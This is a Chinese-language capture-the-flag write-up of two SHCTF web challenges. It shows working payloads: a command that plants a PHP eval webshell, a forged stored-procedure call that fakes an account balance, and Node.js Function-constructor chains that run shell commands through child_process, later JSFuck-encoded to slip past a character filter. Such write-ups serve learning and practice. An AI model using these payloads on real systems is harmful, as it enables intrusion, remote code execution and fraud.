# The-third-SHCTF
放GitHub做个记录，复盘一下（其实是每道题都学一遍）

05_em_v_CFK

<img width="1445" height="870" alt="image" src="https://github.com/user-attachments/assets/87577f86-ea07-4df6-ac71-ebe626eb7d11" />


一个flag购买商店，然后看源码可以看到一段特别的注释：
5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa

这个可能还是得靠经验，是rot13加base64解码出来如下：

我上传了个shell.php, 带上show参数get小明的圣遗物吧

然后这里直接访问/shell.php?get显示404，因此可能存在前置路径，用dirsearch能够扫出来uploads,因此可以加上该路径后再进行访问如下：

<img width="956" height="536" alt="image" src="https://github.com/user-attachments/assets/54ee92c7-29e5-4a15-af5b-cef9ca146b91" />


把pass放到md5解密网站上出来就是114514，然后后面的cmd可以执行响应命令，可以构造webshell:

key=114514&cmd=echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php

写入成功后可以连接蚁剑，找到index.php,但是我们无法直接修改余额，因此可以先把该文件保存到本地删除再修改上传，发现可以，最后得到我们的flag

<img width="1547" height="551" alt="image" src="https://github.com/user-attachments/assets/02f75374-0246-4132-b778-8c293fd4be19" />


然后这里不连webshell的方法有点复杂，先是ls找文件，然后用：

cmd=find / -name "flag" 

也找不到，说明flag不在系统文件，很可能在数据库中，复现大佬的解题过程：

key=114514&cmd=base64 ../index.php 第一次知道这样的...
```php
<?php
include 'connect.php';

$my_money = 3.00;
$msg = "";
$target_id = 0;

if (isset($_POST['buy']) && isset($_POST['item_id'])) {
    $target_id = (int)$_POST['item_id'];

    if ($target_id > 0) {
        try {
            $stmt = $pdo->prepare("CALL buy_item(?, ?)");
            $stmt->execute([$target_id, $my_money]);
            $res = $stmt->fetch();
            $msg = $res['final_message'];
            $my_money -= $res['current_price'];
        } catch (Exception $e) {
            $msg = "Transaction Error: " . $e->getMessage();
        }
    } else {
        $msg = "Invalid item selected.";
    }
} else {
    try {
        $stmt = $pdo->query("SELECT id, name, price FROM goods ORDER BY id ASC");
        if ($stmt === false) {
            exit;
        }
        $goods_list = $stmt->fetchAll();
    } catch (Exception $e) {
        die("Error fetching goods list.");
    }
}
?>
```

这里的核心在如下两行代码中：

$stmt = $pdo->prepare("CALL buy_item(?, ?)");

$stmt->execute([$target_id, $my_money]);

这里发现了一个关键的逻辑漏洞：
后端调用了一个名为 buy_item 的存储过程。传递的参数是 ($target_id, $my_money)。这里的 $my_money 是 PHP 变量。虽然正常用户只能是 3 块钱，但既然我们有了 Webshell，我们可以直接调用这个存储过程，并传入任意金额,构造的payload为：

key=114514&code=include('../connect.php');var_dump($pdo->query("CALL buy_item(3, 50)")->fetchAll());

原理：
include('../connect.php');：利用现成的文件建立数据库连接对象 $pdo，无需知道数据库密码。
CALL buy_item(3, 50)：手动调用存储过程，购买 ID 3 的商品，并欺骗数据库说我有 50 块钱。

<img width="2130" height="665" alt="image" src="https://github.com/user-attachments/assets/a3e676b5-803b-4558-b439-3fbfab690292" />

```javascript
const express = require('express');
const app = express();
const port = 5000;

app.use(express.json());


const WAF = (recipe) => {
    const ALLOW_CHARS = /^[012345679!\.\-\+\*\/\(\)\[\]]+$/;
    if (ALLOW_CHARS.test(recipe)) {
        return true;
    }
    return false;
};


function calc(operator) {
    return eval(operator);
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});


app.post('/calc', (req, res) => {
    const { expr } = req.body;
    console.log(expr);
    if(WAF(expr)){
        var result = calc(expr);
        res.json({ result });
    }else{
        res.json({"result":"WAF"});
    }
});


app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
```
服务器端用的是 eval() 执行用户输入

限制 (WAF)：正则 /^[012345679!.-+*/()[]]+$/ 限制了输入字符。

禁用了字母、引号、大括号等。

允许了 []()!+，这正是 JSFuck 语言的核心字符集。

这种题其实是 JavaScript 原型链 + Function 构造器利用，在很多 Node.js CTF Web RCE 里非常经典，但我没碰到过....所以还得从头来一遍，一般构造的是这样的，最基础的：
```javascript
[]["filter"]["constructor"]("return process")()
```
本质是在 不用直接写 Function 的情况下构造一个函数并执行。

在 JavaScript 里：
```javascript
[].filter
```
是一个函数。

也就是：
```javascript
[].filter === Array.prototype.filter
```
它其实长这样：
```javascript
function filter() { [native code] }
```
在 JS 里：
```javascript
function a(){}
```
它的：
```javascript
a.constructor
```
是：
```javascript
Function
```
验证：
```javascript
[].filter.constructor
```
结果就是：
```javascript
Function
```
所以：
```javascript
[]["filter"]["constructor"]
```
等价于：`
```javascript
Function
```
也就是：
```javascript
Function("code")
```
JavaScript 有一个 动态创建函数的方法：
```javascript
new Function("code")
```
例如：
```javascript
var f = new Function("return 1+1")
f()
```
输出：
```
2
```
等价于：
```javascript
eval("1+1")
```
所以：
```javascript
Function("return process")()
```
就会执行：
return process

那么再结合起来看一遍：
```javascript
[]["filter"]["constructor"]("return process")()
```
第一步
```javascript
[]["filter"]
```
得到：
```javascript
function filter() { [native code] }
```
第二步
```javascript
[]["filter"]["constructor"]
```
得到：
```javascript
Function
```
第三步
```javascript
Function("return process")
```
创建函数：
```javascript
function(){
  return process
}
```
第四步后面的执行函数：
```
()
```

最终效果：
```javascript
process
```
在process中含有许多东西，我们可以通过process去调用require，就是一个关键链：

process.mainModule.require //相当于require

而require是加载模块（module）用的函数。
简单理解：把别的代码文件或内置库引入进来使用。

常见例子如下：
```javascript
const fs = require("fs")
fs.readFileSync("flag.txt")
```
作用就是读取文件

```javascript
const cp = require("child_process")
cp.execSync("ls")
```
作用是引入系统命令

还有一种是引入自己写的文件，比如文件名为a.js
```javascript
const a = require("./a.js")
console.log(a)
```
输出文件中写的内容

然后这里其实可以看到wp最前面用的不是filter，有用到flat啥的，本质都是为了利用function构造器，以下这些都可以：
```javascript
[]["map"]["constructor"]
[]["sort"]["constructor"]
[]["flat"]["constructor"]
setTimeout["constructor"]
规则:任何函数.constructor = Function
```
这里选flat：
```javascript
[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('ls /').toString()")()
[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()
```
然后jsfuck编码一下：

<img width="2307" height="450" alt="image" src="https://github.com/user-attachments/assets/518fc8b3-f20a-4de2-a69d-cbb0fa505ec1" />



